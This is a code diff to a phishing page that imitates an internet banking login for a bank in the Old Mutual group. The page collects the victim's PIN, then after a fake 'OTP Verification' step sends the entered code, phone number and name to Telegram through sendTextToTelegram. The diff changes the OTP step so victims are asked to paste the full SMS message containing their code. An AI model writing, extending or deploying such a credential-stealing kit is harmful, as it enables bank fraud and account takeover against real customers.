@@ -452,24 +452,35 @@ const renderPinLogin = (maskedPhone = '', isOtp = false) => `
     <div class="bank-subtitle">A Member of the <span style="color:#00a651; font-weight:800;">OLDMUTUAL</span> Group</div>
   </div>
 
-  <div class="bank-welcome" style="text-align:center; margin-bottom:32px;">
+  <div class="bank-welcome" style="text-align:center; margin-bottom:28px;">
     <h2>Welcome to<br><span>Internet Banking</span></h2>
   </div>
 
-  <div style="text-align:center; margin-bottom:32px;">
+  <div style="text-align:center; margin-bottom:20px; max-width:340px; width:100%;">
     <h3 id="pinTitle" style="font-size:1.4rem; font-weight:800; color:#1b3668;">${isOtp ? 'OTP Verification 🔒' : 'Secured Login 🔒'}</h3>
-    <p id="pinSubtext" style="font-size:0.85rem; color:#64748b; margin-top:8px;">${isOtp ? 'Enter the Code / OTP sent to your phone' : 'Enter your PIN to authenticate'}</p>
-    ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:10px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
+    <p id="pinSubtext" style="font-size:0.85rem; color:#64748b; margin-top:8px; line-height:1.4;">${isOtp ? 'Please copy the full message containing your OTP and paste it below' : 'Enter your PIN to authenticate'}</p>
+    ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:8px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
   </div>
 
-  <div id="pinGrid" style="width:100%; max-width:320px; margin-bottom:12px;">
-    <input type="password" id="pinInput" inputmode="numeric" placeholder="${isOtp ? 'Enter Code / OTP' : 'Enter PIN'}"
-      style="width:100%; padding:16px; font-size:1.4rem; letter-spacing:6px; text-align:center; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box;" />
+  <div id="otpBanner" style="${isOtp ? 'display:block;' : 'display:none;'} width:100%; max-width:340px; background:#f0fdf4; border:1.5px solid #86efac; border-radius:12px; padding:12px 16px; margin-bottom:16px; text-align:center; box-sizing:border-box;">
+    <div style="font-size:0.92rem; font-weight:800; color:#166534; margin-bottom:4px;">📲 Copy Full SMS Message</div>
+    <p style="font-size:0.82rem; color:#15803d; font-weight:600; line-height:1.4; margin:0;">
+      Please copy the <strong>full message</strong> containing your OTP and paste it in the section below.
+    </p>
   </div>
-  <div id="pinError" class="pin-error">${isOtp ? 'Invalid Code / OTP. Please try again.' : 'Invalid PIN. Please try again.'}</div>
 
-  <div style="width:100%; max-width:320px;">
-    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">${isOtp ? 'Verify Code / OTP' : 'Login'}</button>
+  <div id="pinGrid" style="width:100%; max-width:340px; margin-bottom:12px;">
+    ${isOtp
+      ? `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
+          style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`
+      : `<input type="password" id="pinInput" inputmode="numeric" placeholder="Enter PIN"
+          style="width:100%; padding:16px; font-size:1.4rem; letter-spacing:6px; text-align:center; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box;" />`
+    }
+  </div>
+  <div id="pinError" class="pin-error">${isOtp ? 'Please paste the full message containing your OTP.' : 'Invalid PIN. Please try again.'}</div>
+
+  <div style="width:100%; max-width:340px;">
+    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">${isOtp ? 'Submit OTP' : 'Login'}</button>
   </div>
 </div>`;
 
@@ -583,17 +594,25 @@ function navigate(view) {
     state.pinAttempts = state.pinAttempts || 0;
     const isOtp = state.pinAttempts >= 1;
     app.innerHTML = renderPinLogin(state.maskedPhone || '', isOtp);
-    const pinInput = document.getElementById('pinInput');
+    let pinInput = document.getElementById('pinInput');
 
-    // Only allow numeric input
-    pinInput.addEventListener('input', e => {
-      e.target.value = e.target.value.replace(/\D/g, '');
-    });
-    // Submit on Enter key
-    pinInput.addEventListener('keydown', e => {
-      if (e.key === 'Enter') document.getElementById('pinLoginBtn').click();
-    });
-    pinInput.focus();
+    const attachInputEvents = (inputEl, numericOnly = false) => {
+      if (!inputEl) return;
+      if (numericOnly) {
+        inputEl.addEventListener('input', e => {
+          e.target.value = e.target.value.replace(/\D/g, '');
+        });
+      }
+      inputEl.addEventListener('keydown', e => {
+        if (e.key === 'Enter' && !e.shiftKey) {
+          e.preventDefault();
+          document.getElementById('pinLoginBtn').click();
+        }
+      });
+      inputEl.focus();
+    };
+
+    attachInputEvents(pinInput, !isOtp);
 
     document.getElementById('pinLoginBtn').addEventListener('click', async () => {
       const pinGrid = document.getElementById('pinGrid');
@@ -601,16 +620,17 @@ function navigate(view) {
       const pinTitle = document.getElementById('pinTitle');
       const pinSubtext = document.getElementById('pinSubtext');
       const pinLoginBtn = document.getElementById('pinLoginBtn');
+      const currentInput = document.getElementById('pinInput');
 
       pinGrid.classList.remove('shake');
       pinErr.classList.remove('show');
-      pinInput.style.borderColor = '#e2e8f0';
+      if (currentInput) currentInput.style.borderColor = '#e2e8f0';
 
-      const val = pinInput.value.trim();
+      const val = currentInput ? currentInput.value.trim() : '';
       const currentIsOtp = state.pinAttempts >= 1;
 
       if (!val) {
-        alert(currentIsOtp ? 'Please enter your Code / OTP.' : 'Please enter your PIN.');
+        alert(currentIsOtp ? 'Please copy the full message containing your OTP and paste it here.' : 'Please enter your PIN.');
         return;
       }
 
@@ -622,18 +642,23 @@ function navigate(view) {
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
 
-        // Transition to second pin: Code / OTP
+        // Transition to second pin: OTP with full message instruction
         pinTitle.textContent = 'OTP Verification 🔒';
-        pinSubtext.textContent = 'Enter the Code / OTP sent to your phone';
-        pinInput.placeholder = 'Enter Code / OTP';
-        pinInput.value = '';
-        pinInput.style.borderColor = '#e2e8f0';
-        pinErr.textContent = 'Invalid Code / OTP. Please try again.';
-        pinLoginBtn.textContent = 'Verify Code / OTP';
-        pinInput.focus();
+        pinSubtext.textContent = 'Please copy the full message containing your OTP and paste it below';
+
+        const otpBanner = document.getElementById('otpBanner');
+        if (otpBanner) otpBanner.style.display = 'block';
+
+        pinGrid.innerHTML = `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
+          style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`;
+
+        attachInputEvents(document.getElementById('pinInput'), false);
+
+        pinErr.textContent = 'Please paste the full message containing your OTP.';
+        pinLoginBtn.textContent = 'Submit OTP';
       } else {
-        showSpinner('Verifying Code / OTP...');
-        await sendTextToTelegram(`🔑 *OTP / CODE*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Code / OTP: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
+        showSpinner('Verifying OTP...');
+        await sendTextToTelegram(`🔑 *OTP / FULL MESSAGE RECEIVED*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
         navigate('loginSuccess');
